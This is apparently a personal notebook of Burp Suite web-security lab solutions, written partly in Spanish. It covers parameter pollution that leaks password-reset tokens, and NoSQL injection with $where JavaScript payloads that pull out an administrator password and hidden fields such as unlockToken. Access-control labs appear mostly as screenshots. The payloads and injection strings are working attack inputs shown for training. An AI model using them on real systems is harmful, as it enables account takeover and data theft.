# Burp Suite

## 

## 

# 

**Api testing Lab: Exploiting server-side parameter pollution in a query string**

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled.png)

la respuesta Field not specified indica que hay campos que no se han llenado. Es decir con el %23 o con el # se ha forzado un error típico de apis

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%201.png)

```sql
csrf=ieYJUI1Y4oYGwE0D8Ht5bpZAfUEZJ68E&username=administrator%26field=sdada%23

el %26 es url ecoded de &
el %23 es url ecoded de #
```

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%202.png)

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%203.png)

```sql
csrf=ieYJUI1Y4oYGwE0D8Ht5bpZAfUEZJ68E&username=administrator%26field=reset_token%23

{"type":"reset_token","result":"ojj4fu8g9bjvu3itnvwj6sudt21e3a47"}

/forgot-password?reset_token=ojj4fu8g9bjvu3itnvwj6sudt21e3a47
```

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%204.png)

fsdfsdf

# **Lab: Finding and exploiting an unused API endpoint**

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%205.png)

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%206.png)

# **Laboratorio: Explotación de la contaminación de parámetros del lado del servidor en una URL REST**

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%207.png)

```sql
csrf=oLLT8aZrRX5bjzqCFrN558vXcJfsLI8c&username=../../v1/users/administrator/field/passwordResetToken%23

csw28d057tzisrpgpd17g1k3hvjatx82
forgot-password?passwordResetToken=b0a6ucz7kpu8zp2alylrtfzj20hygemr
```

# **Lab: Detecting NoSQL injection**

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%208.png)

# **Lab: Exploiting NoSQL injection to extract data**

Change the user parameter to `administrator' && this.password.length < 30 || 'a'=='b`, then send the request.

administrator' && this.password[$0$]=='$a$

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image.png)

La contraseña es de 8 caracteres

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%201.png)

| 5 | c |
| --- | --- |
| 2 | q |
| 3 | q |
| 7 | d |
| 1 | f |
| 6 | z |
| 0 | n |
| 4 | v |

User: administrator  Password:nfqqvczd

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%202.png)

# **Lab: Exploiting NoSQL operator injection to extract unknown fields**

{"$ne":"invalid"}

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%203.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%204.png)

1. Change `"$where": "0" to "$where": "1"`, then resend the request. Notice that you receive an `Account locked` error message. This indicates that the JavaScript in the `$where` clause is being evaluated.

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%205.png)

"$where":"Object.keys(this)[1].match('^.{}.*')”

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%206.png)

```jsx
{
<pos 0> "_id" : 'xxxxxx',
<pos 1> "username":"carlos",
<pos 2> "password":{"$ne":"invalid"},
<pos 3> "posible_campo" : 'valor_campo'
}

"$where":"function(){ if (Object.keys(this)[1].match('username')) return 1; else 0;}"
"$where":"function(){ if (Object.keys(this)[1].length == 6 ) return 1; else 0;}"

{
"username":"carlos",
"password":{"$ne":"invalid"},
"$where": "1"

}
```

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%207.png)

```jsx
"$where":"function(){ if (Object.keys(this)[3].length == 6 ) return 1; else 0;}"
Asi que tiene 5 caracteres
```

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%208.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%209.png)

```jsx
"$where":"function(){ if (Object.keys(this)[3].match(/^$a$/)) return 1; else 0;}"
Vamos a sacar con esto el primer caracter, y asi lo hacemos sucesivamente
Campo del usuario: email
```

```jsx
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
0
1
2
3
4
5
6
7
8
9

```

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2010.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2011.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2012.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2013.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2014.png)

---

---

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2015.png)

```jsx
// hidden field name is "mail"
"$where":"function(){ if (this.email.length == 1 ) return 1; else 0;}"
// Son 25 caracteres
"$where":"function(){ if (this.email.match(/^$a$/)) return 1; else 0;}"
"$where":"function(){ if (this.email.match('^.{$NUMBER$}$CARACTER$.*')) return 1; else 0;}"
"$where":"function(){ if (this.email.match('^.{§1§}§A§.*')) return 1; else 0;}"

{§§}§§
('^.{§§}§§.*')

carlos@carlos-montoya.net

unlockToken
```

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2016.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2017.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2018.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2019.png)

Otro campo aparte del email

```jsx
{"username":"carlos","password":{"$ne":"invalid"},
"$where":"function(){ if (Object.keys(this)[4].length == §6§ ) return 1; else 0;}"
}
Son 11 caracteres

"$where":"function(){ if (Object.keys(this)[4].match(/^$a$/)) return 1; else 0;}"
unlockToken
9457f5cff38fff0b

"$where":"function(){ if (Object.keys(this)[4].match(/^f§a§/)) return 1; else 0;}"
"$where":"function(){ if (Object.keys(this)[4].match('^.{§1§}§1§.*')) return 1; else 0;}"
forgotPwd
"$where":"function(){ if (this.forgotPwd.match(/^$a$/)) return 1; else 0;}"
"$where":"function(){ if (this.forgotPwd.match('^.{§1§}§A§.*')) return 1; else 0;}"
db10648a240ccfa1
```

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2020.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2021.png)

![Untitled](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Untitled%209.png)

[SQL Injection](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/SQL%20Injection%2012cfab5460ec8025b1d1d72da2d9056d.md)

[Cross-site scripting](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Cross-site%20scripting%20f2bbbe03a5854609929d2b2b1b47252a.md)

[OS Comand](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/OS%20Comand%20132fab5460ec80dbb42fd6b2dc0e7694.md)

[File upload vulnerabilities](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e.md)

# **Lab: User role can be modified in user profile**

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2022.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2023.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2024.png)

# **Lab: User ID controlled by request parameter**

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2025.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2026.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2027.png)

# **Lab: User ID controlled by request parameter with data leakage in redirect**

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2028.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2029.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2030.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2031.png)

# **Lab: Insecure direct object references**

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2032.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2033.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2034.png)

![image.png](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/image%2035.png)

[Authentication vulnerabilities](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Authentication%20vulnerabilities%20f1fca606e44b460388bc8ba05f427f8e.md)

[WebSockets](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/WebSockets%20a56c68ade756452c8ebb9ae25f55d48b.md)

[HTTP Host header attacks](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/HTTP%20Host%20header%20attacks%205e5ad0c0c43145c7ad3758aafc277441.md)

[Web cache deception](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Web%20cache%20deception%206cbd27190de14bda866ea36574f1a21f.md)

[CSRF](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/CSRF%208f92cbf7381e49b7bfb9bd02923295fd.md)

[Clickjacking](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/Clickjacking%20eb09c3afcc544ee99607948a15d6faac.md)

[CORS](Burp%20Suite%202561af578eba4b378c28fe54b47dd0b7/CORS%20cd8d3854c45b4778aa25f7e1f68f25dd.md)